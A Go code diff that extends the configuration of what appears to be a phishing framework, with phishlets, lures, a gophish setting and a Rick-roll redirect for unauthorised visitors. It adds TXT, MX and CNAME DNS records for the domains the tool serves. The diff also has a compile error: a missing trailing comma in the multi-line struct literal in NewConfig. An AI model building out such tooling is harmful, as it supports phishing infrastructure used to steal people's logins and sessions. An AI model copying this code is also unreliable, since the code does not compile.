@@ -14,6 +14,21 @@ import (
 
 var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}
 
+type TXTRecord struct {
+	Name  string `mapstructure:"name" json:"name" yaml:"name"`
+	Value string `mapstructure:"value" json:"value" yaml:"value"`
+}
+
+type CNAMERecord struct {
+	Name   string `mapstructure:"name" json:"name" yaml:"name"`
+	Target string `mapstructure:"target" json:"target" yaml:"target"`
+}
+
+type MXRecord struct {
+	Priority   uint16 `mapstructure:"priority" json:"priority" yaml:"priority"`
+	MailServer string `mapstructure:"mail_server" json:"mail_server" yaml:"mail_server"`
+}
+
 type Lure struct {
 	Id              string `mapstructure:"id" json:"id" yaml:"id"`
 	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
@@ -90,6 +105,9 @@ type Config struct {
 	lures           []*Lure
 	lureIds         []string
 	subphishlets    []*SubPhishlet
+	txtRecords	[]*TXTRecord
+	mxRecords	[]*MXRecord
+	cnameRecords	[]*CNAMERecord
 	cfg             *viper.Viper
 }
 
@@ -102,6 +120,9 @@ const (
 	CFG_BLACKLIST    = "blacklist"
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
+	CFG_TXTRECORDS   = "txtrecords"
+	CFG_MXRECORDS    = "mxrecords"
+	CFG_CNAMERECORDS = "cnamerecords"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -116,6 +137,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishletNames:   []string{},
 		lures:           []*Lure{},
 		blacklistConfig: &BlacklistConfig{},
+		txtRecords:      []*TXTRecord{},
+		mxRecords:       []*MXRecord{},
+		cnameRecords:    []*CNAMERecord{}
 	}
 
 	c.cfg = viper.New()
@@ -183,6 +207,15 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+	
+	c.txtRecords = []*TXTRecord{}
+	c.cfg.UnmarshalKey(CFG_TXTRECORDS, &c.txtRecords)
+	c.cnameRecords = []*CNAMERecord{}
+	log.Debug("Before unmarshalling cnamerecords: %d", len(c.cnameRecords))
+	c.cfg.UnmarshalKey(CFG_CNAMERECORDS, &c.cnameRecords)
+	log.Debug("After unmarshalling cnamerecords: %d", len(c.cnameRecords))
+	c.mxRecords = []*MXRecord{}
+	c.cfg.UnmarshalKey(CFG_MXRECORDS, &c.mxRecords)
 
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
